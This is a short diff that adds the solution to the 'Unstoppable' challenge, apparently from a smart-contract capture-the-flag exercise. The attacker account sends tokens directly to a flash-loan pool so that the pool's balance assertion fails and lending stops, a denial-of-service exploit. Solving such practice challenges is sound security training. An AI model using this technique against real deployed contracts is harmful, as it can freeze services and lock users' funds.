@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /** the pool got a strange assert, make it failed by sending the pool somme token */
+        const tenToken = ethers.utils.parseEther('10');
+        await this.token.connect(attacker).transfer(this.pool.address, tenToken);
     });
 
     after(async function () {
